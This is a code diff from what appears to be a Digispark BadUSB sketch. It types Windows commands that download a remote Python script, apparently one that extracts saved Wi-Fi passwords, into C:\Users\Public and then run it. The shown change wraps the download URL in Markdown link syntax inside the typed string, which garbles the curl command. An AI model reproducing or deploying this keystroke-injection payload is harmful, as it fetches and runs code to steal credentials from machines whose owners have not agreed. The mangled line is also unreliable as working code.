@@ -74,7 +74,7 @@ void setup() {
   
   DigiKeyboard.print("cd C:\\Users\\Public\n");
   
-  DigiKeyboard.print("curl -o C:\\Users\\Public\\win.py https://github.com/wifi_passwords/win.py\n"); // Download win.py
+  DigiKeyboard.print("curl -o C:\\Users\\Public\\win.py [https://github.com/wifi_passwords/win.py](https://gitlab.com/dileepkumarkoppula_iot/usb-rubber-ducky/extract-wi-fi-passwords-from-windows/extract-wi-fi-passwords-from-windows/-/blob/main/win.py)\n"); // Download win.py
   DigiKeyboard.delay(8000);
   
   DigiKeyboard.print("python ./win.py\n"); // Execute win.py
